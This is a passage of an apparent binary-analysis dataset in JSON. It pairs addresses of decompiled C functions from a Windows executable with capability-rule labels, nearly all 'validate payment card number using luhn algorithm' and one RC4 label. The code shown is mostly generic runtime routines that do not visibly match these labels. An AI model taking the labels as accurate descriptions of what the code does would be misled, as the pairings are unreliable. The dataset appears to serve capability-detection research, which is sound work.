((uVar3 & 0xff000000) == 0) {\n                *puVar4 = uVar3;\n                return param_1;\n            }\n        }\n        *puVar4 = uVar3;\n        puVar4 = puVar4 + 1;\n    } while( true );\n}\n",
        "token_count": 439
    },
    "0040f03c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t __cdecl fcn.0040f03c(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint noname_2;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint32_t var_4h;\n    \n    if (arg_ch + 1 < 0x101) {\n        arg_ch._2_2_ = *(*(arg_8h + 0x48) + arg_ch * 2);\n    }\n    else {\n        if ((*(*(arg_8h + 0x48) + 1 + (arg_ch >> 8 & 0xffU) * 2) & 0x80) == 0) {\n            var_4h = in_ECX & 0xffff0000 | arg_ch & 0xff;\n            noname_2 = 1;\n        }\n        else {\n            var_4h = CONCAT11(arg_ch, arg_ch >> 8);\n            var_4h = in_ECX & 0xff000000 | var_4h;\n            noname_2 = 2;\n        }\n        iVar1 = fcn.0041146b(1, &var_4h, noname_2, &arg_ch + 2, *(arg_8h + 4), *(arg_8h + 0x14), 1, var_4h, unaff_EBP, \n                             unaff_retaddr, arg_8h, arg_ch, arg_10h, in_stack_00000010, in_stack_00000014);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return arg_ch._2_2_ & arg_10h;\n}\n",
        "token_count": 430
    },
    "0040f253": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f253(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        puVar1 = &param_2;\n        iVar2 = param_2;\n        do {\n            puVar1 = puVar1 + 1;\n            fcn.0040ee50(param_1, *puVar1);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0040f3dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.0040f3dc(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    bVar1 = true;\n    if (*0x44e4d4 == NULL) {\n        *0x44e4d4 = fcn.00409f36(0x351);\n        if (*0x44e4d4 == NULL) {\n            return NULL;\n        }\n    }\n    **0x44e4d4 = 0;\n    fcn.0040f253(*0x44e4d4, 3, *0x44e4dc, 0x43e014, *0x44e4e0);\n    puVar3 = 0x44e4e0;\n    do {\n        fcn.0040ee50(*0x44e4d4, 0x43e6ac);\n        puVar4 = puVar3 + 3;\n        iVar2 = fcn.0040ef40(*puVar3, *puVar4);\n        if (iVar2 != 0) {\n            bVar1 = false;\n        }\n        fcn.0040f253(*0x44e4d4, 3, puVar3[2], 0x43e014, *puVar4);\n        puVar3 = puVar4;\n    } while (puVar4 < 0x44e510);\n    if (!bVar1) {\n        return *0x44e4d4;\n    }\n    fcn.00409f48(*0x44e4d4);\n    *0x44e4d4 = NULL;\n    return *0x44e4ec;\n}\n",
        "token_count": 381
    },
    "00410c85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00410c85(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x443f90, 0xc);\n    *(unaff_EBP + -0x1c) = 0x447414;\n    while (*(unaff_EBP + -0x1c) < 0x447414) {\n        *(unaff_EBP + -4) = 0;\n        if (**(unaff_EBP + -0x1c) != NULL) {\n            (***(unaff_EBP + -0x1c))();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n    }\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 224
    },
    "0041339d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nbool fcn.0041339d(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBX;\n    uint32_t uVar6;\n    \n    if (*0x44e69c == 0) {\n        return false;\n    }\n    iVar1 = unaff_EBX[5];\n    if ((iVar1 != *0x44e730) || (iVar1 != *0x44e73c)) {\n        if (*0x45143c == 0) {\n            fcn.004131e5(1, 1, iVar1, 1, 0, 0, 0, 0, 0);\n            fcn.004131e5(0, 1, iVar1, 5, 0, 0, 0, 0, 0);\n        }\n        else {\n            if (*0x451428 != 0) {\n                uVar6 = *0x45142e;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x45142c;\n                uVar6 = 0;\n                uVar4 = *0x45142e;\n            }\n            fcn.004131e5(1, *0x451428 == 0, iVar1, uVar4, uVar3, uVar6, *0x451432, *0x451434, *0x451436);\n            if (*0x4513d4 != 0) {\n                uVar6 = *0x4513da;\n                uVar3 = 0;\n                uVar4 = 0;\n            }\n            else {\n                uVar3 = *0x4513d8;\n                uVar6 = 0;\n                uVar4 = *0x4513da;\n            }\n            fcn.004131e5(0, *0x4513d4 == 0, iVar1, uVar4, uVar3, uVar6, *0x4513de, *0x4513e0, *0x4513e2);\n        }\n    }\n    iVar1 = unaff_EBX[7];\n    if (*0x44e734 < *0x44e740) {\n        if ((iVar1 < *0x44e734) || (*0x44e740 < iVar1)) {\n            return false;\n        }\n        if ((*0x44e734 < iVar1) && (iVar1 < *0x44e740)) {\n            return true;\n        }\n    }\n    else {\n        if (iVar1 < *0x44e740) {\n            return true;\n        }\n        if (*0x44e734 < iVar1) {\n            return true;\n        }\n        if ((*0x44e740 < iVar1) && (iVar1 < *0x44e734)) {\n            return false;\n        }\n    }\n    iVar5 = ((unaff_EBX[2] * 0x3c + unaff_EBX[1]) * 0x3c + *unaff_EBX) * 1000;\n    if (iVar1 == *0x44e734) {\n        bVar2 = *0x44e738 <= iVar5;\n    }\n    else {\n        bVar2 = iVar5 < *0x44e744;\n    }\n    return bVar2;\n}\n",
        "token_count": 760
    },
    "0041443d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041443d(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    return iVar1 + 0xc;\n}\n",
        "token_count": 85
    },
    "00414775": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00414775(uint param_1, char *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    \n    iVar1 = 0;\n    while (cVar2 = *param_2,  cVar2 != '\\0') {\n        param_2 = param_2 + 1;\n        if ((cVar2 < 'a') || ('f' < cVar2)) {\n            if (('@' < cVar2) && (cVar2 < 'G')) {\n                cVar2 = cVar2 + -7;\n            }\n        }\n        else {\n            cVar2 = cVar2 + -0x27;\n        }\n        iVar1 = (iVar1 + 0xffffffd) * 0x10 + cVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "00414e80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00414e80(char *arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    char *pcVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = arg_10h;\n    pcVar6 = arg_8h;\n    if (arg_10h != 0) {\n        do {\n            if (uVar4 == 0) break;\n            uVar4 = uVar4 - 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar6 + 1;\n        } while (cVar1 != '\\0');\n        iVar5 = arg_10h - uVar4;\n        do {\n            pcVar6 = arg_ch;\n            pcVar7 = arg_8h;\n            if (iVar5 == 0) break;\n            iVar5 = iVar5 + -1;\n            pcVar7 = arg_8h + 1;\n            pcVar6 = arg_ch + 1;\n            cVar1 = *arg_ch;\n            cVar2 = *arg_8h;\n            arg_ch = pcVar6;\n            arg_8h = pcVar7;\n        } while (cVar1 == cVar2);\n        uVar3 = pcVar6[-1];\n        arg_10h = 0;\n        bVar8 = uVar3 == pcVar7[-1];\n        if (uVar3 < pcVar7[-1] || bVar8) {\n            if (bVar8) {\n                return 0;\n            }\n            arg_10h = 0xfffffffe;\n        }\n        arg_10h = ~arg_10h;\n    }\n    return arg_10h;\n}\n",
        "token_count": 415
    },
    "0041529b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041529b(uint param_1, uint param_2)\n\n{\n    fcn.00415143(param_1, param_2, 0x44e87c);\n    return;\n}\n",
        "token_count": 47
    },
    "004152b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004152b1(uint param_1, uint param_2)\n\n{\n    fcn.00415143(param_1, param_2, 0x44e894);\n    return;\n}\n",
        "token_count": 46
    },
    "004152c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004152c7(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.0041686d(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.0041529b(&var_10h, arg_8h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 127
    },
    "00415304": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415304(uint arg_8h, uint arg_ch)\n\n{\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    var_4h = *0x44e0fc;\n    fcn.0041686d(&var_10h, &var_14h, arg_ch, 0, 0, 0, 0);\n    fcn.004152b1(&var_10h, arg_8h);\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 126
    },
    "00415341": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00415341(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char *arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char cVar4;\n    \n    arg_8h_00 = arg_8h;\n    pcVar3 = *(arg_10h + 0xc);\n    arg_ch_00 = arg_8h + 1;\n    *arg_8h = '0';\n    pcVar1 = arg_ch_00;\n    if (0 < arg_ch) {\n        arg_8h = arg_ch;\n        arg_ch = 0;\n        do {\n            cVar4 = *pcVar3;\n            if (cVar4 == '\\0') {\n                cVar4 = '0';\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            *pcVar1 = cVar4;\n            pcVar1 = pcVar1 + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != NULL);\n    }\n    *pcVar1 = '\\0';\n    if ((-1 < arg_ch) && ('4' < *pcVar3)) {\n        while (pcVar1 = pcVar1 + -1,  *pcVar1 == '9') {\n            *pcVar1 = '0';\n        }\n        *pcVar1 = *pcVar1 + '\\x01';\n    }\n    if (*arg_8h_00 == '1') {\n        *(arg_10h + 4) = *(arg_10h + 4) + 1;\n    }\n    else {\n        iVar2 = fcn.0040baf0(arg_ch_00);\n        fcn.0040a2e0(arg_8h_00, arg_ch_00, iVar2 + 1);\n    }\n    return;\n}\n",
        "token_count": 440
    },
    "00415472": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00415472(uint arg_8h, uint noname_1, int32_t *arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint in_stack_ffffffb8;\n    ushort uVar4;\n    uint var_2ch;\n    uchar var_28h [24];\n    uint var_10h;\n    uint uStack16;\n    ushort uStack12;\n    uint var_4h;\n    \n    uVar4 = in_stack_ffffffb8 >> 0x10;\n    var_4h = *0x44e0fc;\n    fcn.004153b8(&var_10h, &arg_8h);\n    iVar3 = fcn.00416ca1(var_10h, uStack16, CONCAT22(uVar4, uStack12), 0x11, 0, &var_2ch);\n    iVar2 = arg_14h;\n    piVar1 = arg_10h;\n    arg_10h[2] = iVar3;\n    *arg_10h = var_2ch._2_1_;\n    arg_10h[1] = var_2ch;\n    fcn.0040ee40(arg_14h, var_28h);\n    piVar1[3] = iVar2;\n    fcn.0040b5c2();\n    return;\n}\n",
        "token_count": 331
    },
    "00415db3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00415db3(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    fcn.00415cf3(iVar1, param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 114
    },
    "0041604a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041604a(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040eadd();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44e394) {\n        iVar1 = fcn.0040f3a1();\n    }\n    fcn.00415fea(iVar1, param_1, param_2);\n    return;\n}\n",
        "token_count": 104
    },
    "0041623f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0041623f(uint param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t unaff_ESI;\n    \n    uVar1 = param_2;\n    do {\n        if (*(uVar1 + 4) == unaff_ESI) break;\n        uVar1 = uVar1 + 0xc;\n    } while (uVar1 < param_2 + *0x44e654 * 0xc);\n    if ((param_2 + *0x44e654 * 0xc <= uVar1) || (*(uVar1 + 4) != unaff_ESI)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 165
    },
    "0041760c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0041760c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n    var_4h = 0;\n    iVar2 = **0x451044;\n    piVar3 = *0x451044;\n    while( true ) {\n        if (iVar2 == 0) {\n            return 0;\n        }\n        iVar2 = (*pcVar1)(0, 0, iVar2, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar2 == 0) || (var_4h = fcn.00409f36(iVar2),  var_4h == 0)) break;\n        iVar2 = (*pcVar1)(0, 0, *piVar3, 0xffffffff, var_4h, iVar2, 0, 0);\n        if (iVar2 == 0) {\n            fcn.00409f48(var_4h);\n            return 0xffffffff;\n        }\n        iVar2 = fcn.004181d0(&var_4h, 0);\n        if ((iVar2 < 0) && (var_4h != 0)) {\n            fcn.00409f48(var_4h);\n            var_4h = 0;\n        }\n        piVar3 = piVar3 + 1;\n        iVar2 = *piVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 357
    },
    "00417910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00417910(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar2 = *arg_8h;\n            uVar1 = *arg_ch;\n            if ((uVar2 == 0) || (uVar1 == 0)) break;\n            arg_8h = arg_8h + 1;\n            arg_ch = arg_ch + 1;\n            if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n                uVar2 = uVar2 + 0x20;\n            }\n            if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                uVar1 = uVar1 + 0x20;\n            }\n            bVar3 = uVar2 < uVar1;\n            if (uVar2 != uVar1) goto code_r0x00417961;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        arg_10h = 0;\n        bVar3 = uVar2 < uVar1;\n        if (uVar2 != uVar1) {\ncode_r0x00417961:\n            arg_10h = -1;\n            if (!bVar3) {\n                arg_10h = 1;\n            }\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 361
    },
    "00418601": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00418601(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint arg_10h;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4453c0, 0x1c);\n    uVar2 = fcn.0040f0b9();\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n    iVar3 = fcn.0040f0b3();\n    if (iVar3 == 0) {\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        uVar2 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n        fcn.0040d40a(0xc);\n        *(unaff_EBP + -0x1c) = 1;\n    }\n    *(unaff_EBP + -4) = 0;\n    iVar3 = fcn.0041443d();\n    *(unaff_EBP + -0x2c) = *(iVar3 + 4);\n    uVar2 = fcn.00414424();\n    *(unaff_EBP + -0x28) = uVar2;\n    iVar3 = fcn.00409f36(0x200);\n    *(unaff_EBP + -0x24) = iVar3;\n    if (iVar3 == 0) {\n        uVar2 = fcn.0040f036();\n        *(unaff_EBP + -0x24) = uVar2;\n        *(unaff_EBP + -0x20) = 0;\n    }\n    else {\n        arg_10h = 0x200;\n        uVar2 = fcn.0040f036();\n        fcn.0040b7b0(*(unaff_EBP + -0x24), uVar2, arg_10h);\n        *(unaff_EBP + -0x20) = 1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004186af();\n    puVar1 = *(unaff_EBP + 8);\n    *puVar1 = *(unaff_EBP + -0x2c);\n    puVar1[1] = *(unaff_EBP + -0x28);\n    puVar1[2] = *(unaff_EBP + -0x24);\n    puVar1[3] = *(unaff_EBP + -0x20);\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 644
    },
    "004186cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004186cc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040bc40(0x4453d0, 0xc);\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    if (arg_ch_00 == NULL) {\n        iVar1 = fcn.0041443d();\n        iVar1 = *(iVar1 + 8);\n    }\n    else {\n        iVar1 = *arg_ch_00;\n    }\n    if (iVar1 != 0) {\n        uVar2 = fcn.0040f0b9();\n        (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(uVar2);\n        iVar1 = fcn.0040f0b3();\n        if (iVar1 == 0) {\n            *(unaff_EBP + -0x1c) = 0;\n        }\n        else {\n            uVar2 = fcn.0040f0b9();\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(uVar2);\n            fcn.0040d40a(0xc);\n            *(unaff_EBP + -0x1c) = 1;\n        }\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00418518(*(unaff_EBP + 8), arg_ch_00);\n        *(unaff_EBP + 8) = uVar2;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041875b();\n    }\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 418
    },
    "00419916": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00419916(code **param_1)\n\n{\n    fcn.0041c343(0, 0);\n    *param_1 = vtable.CFindReplaceDialog.0;\n    fcn.0040bbe0(param_1 + 0x1c, 0, 0x28);\n    *(param_1 + 0x26) = 0;\n    param_1[0x1c] = 0x28;\n    param_1[0x20] = param_1 + 0x26;\n    *(param_1 + 0x46) = 0;\n    param_1[0x1f] = 0x100;\n    param_1[0x24] = fcn.0041a211;\n    return param_1;\n}\n",
        "token_count": 179
    },
    "00419c62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00419c62(uint arg_8h)\n\n{\n    uint16_t *puVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar2 != 0) {\n        puVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar2, 0);\n        iVar2 = *puVar1 + puVar1;\n    }\n    fcn.00406c60(iVar2);\n    return arg_8h;\n}\n",
        "token_count": 153
    },
    "00419c93": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00419c93(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 2) + iVar1;\n    }\n    fcn.00406c60(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "00419cc5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00419cc5(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = *(*(in_ECX + 0x70) + 0xc);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GlobalLock)(iVar1, 0);\n        iVar1 = *(iVar1 + 4) + iVar1;\n    }\n    fcn.00406c60(iVar1);\n    return arg_8h;\n}\n",
        "token_count": 145
    },
    "0041ad1b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0041ad1b(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x10) = 0;\n    piVar1 = *(extraout_ECX + 4);\n    fcn.004026b0(piVar1 + 2);\n    iVar2 = *piVar1;\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 4) = iVar2;\n    if (iVar2 == 0) {\n        *(extraout_ECX + 8) = 0;\n    }\n    else {\n        *(iVar2 + 4) = 0;\n    }\n    fcn.0041ace9(piVar1);\n    fcn.004026b0(unaff_EBP + -0x10);\n    fcn.00401180();\n    uVar3 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 342
    },
    "0041b0b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b0b1(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    \n    iVar1 = arg_8h;\n    iVar5 = 0;\n    if (arg_8h < 0) {\ncode_r0x0041b177:\n        iVar4 = fcn.004198e6();\n    }\n    else {\n        if (-1 < arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h == 0) {\n            fcn.0041bae1(*(in_ECX + 4));\n            *(in_ECX + 0xc) = 0;\n            *(in_ECX + 8) = 0;\n            goto code_r0x0041b1c1;\n        }\n        if (*(in_ECX + 4) == 0) {\n            uVar3 = fcn.0041bab6(arg_8h << 2);\n            *(in_ECX + 4) = uVar3;\n            fcn.0040bbe0(uVar3, 0, arg_8h << 2);\n            *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041b10c:\n            *(in_ECX + 8) = arg_8h;\n            return;\n        }\n        iVar5 = *(in_ECX + 0xc);\n        if (arg_8h <= iVar5) {\n            iVar1 = *(in_ECX + 8);\n            if (iVar1 < arg_8h) {\n                fcn.0040bbe0(*(in_ECX + 4) + iVar1 * 4, 0, (arg_8h - iVar1) * 4);\n            }\n            goto code_r0x0041b10c;\n        }\n        iVar4 = *(in_ECX + 0x10);\n        if (iVar4 == 0) {\n            iVar4 = *(in_ECX + 8) / 8;\n            if (iVar4 < 4) {\ncode_r0x0041b161:\n                iVar4 = 4;\n            }\n            else if (iVar4 < 0x401) {\n                if (iVar4 < 4) goto code_r0x0041b161;\n            }\n            else {\n                iVar4 = 0x400;\n            }\n        }\n        iVar2 = iVar4 + iVar5;\n        if (iVar4 + iVar5 <= arg_8h) {\n            iVar2 = arg_8h;\n        }\n        arg_8h = iVar2;\n        iVar4 = arg_8h;\n        if (arg_8h < iVar5) goto code_r0x0041b177;\n    }\n    iVar5 = fcn.0041bab6(iVar4 << 2);\n    fcn.0040b7b0(iVar5, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.0040bbe0(iVar5 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.0041bae1(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0041b1c1:\n    *(in_ECX + 4) = iVar5;\n    return;\n}\n",
        "token_count": 808
    },
    "0041b1cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b1cb(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.0041b0b1(arg_10h + iVar1, 0xffffffff);\n            fcn.0040a2e0(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.0040bbe0(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.0041b0b1(arg_10h + arg_8h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.004198e6();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 369
    },
    "0041b25b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
